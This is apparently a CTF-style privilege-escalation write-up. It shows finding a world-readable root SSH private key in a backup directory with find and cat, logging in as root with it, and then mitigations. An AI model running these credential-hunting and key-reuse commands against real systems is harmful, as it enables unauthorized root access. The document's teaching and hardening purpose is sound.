## Privilege Escalation – SSH Private Key Exposure
 Overview

In this scenario, a poorly secured backup directory exposed an SSH private key, allowing a low‑privileged user to gain direct root access to the system via SSH.

 ## Enumeration
Searching for SSH private keys on the system
```bash
find / -name id_rsa 2>/dev/null
```
Output:
```bash
/backups/supersecretkeys/id_rsa
```
Inspecting the backup directory
```bash
cd /backups/supersecretkeys
ls -la
```

Output:
```bash
-rw-rw-rw- 1 root root 1675 id_rsa
```
Reading the private key
```bash
cat id_rsa
```
 The file contained a valid OpenSSH private key.

## Observation

* SSH private key stored in a world‑readable backup directory
* No permission restrictions applied
* Key belongs to a privileged user (root)

 Exposure of private SSH keys leads to instant system compromise.

## Exploitation

The exposed private key was used to authenticate as root via SSH:
```bash
ssh -i id_rsa -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@target_ip
               or
 ssh -i id_rsa root@target_ip
```
 Privilege Escalation Verification
```bash
root@debian:~# whoami
root

root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
```

 Root access successfully obtained

## Root Cause Analysis

* Sensitive SSH private key stored in plaintext
* Improper file permissions
* Backup directory accessible to low‑privileged users
* No SSH key management or rotation in place



##  Mitigation 

To prevent privilege escalation via exposed SSH private keys, the following security controls should be implemented:

1.)  Secure SSH Private Keys

Ensure strict permissions on private keys:
```bash
chmod 600 ~/.ssh/id_rsa
chown root:root ~/.ssh/id_rsa
```

Never store private keys in world-readable locations.

2.) Secure Backup Directories

Restrict access to backup locations:
```bash
chmod 700 /backups
chown root:root /backups
```

Avoid storing sensitive credentials inside backup directories.

3.) Implement SSH Key Management

Remove unauthorized or unused SSH keys from ~/.ssh/authorized_keys.

4.) Disable Direct Root SSH Login

Prevent direct root access via SSH:
```bash 
PermitRootLogin no

```
(Location: /etc/ssh/sshd_config)

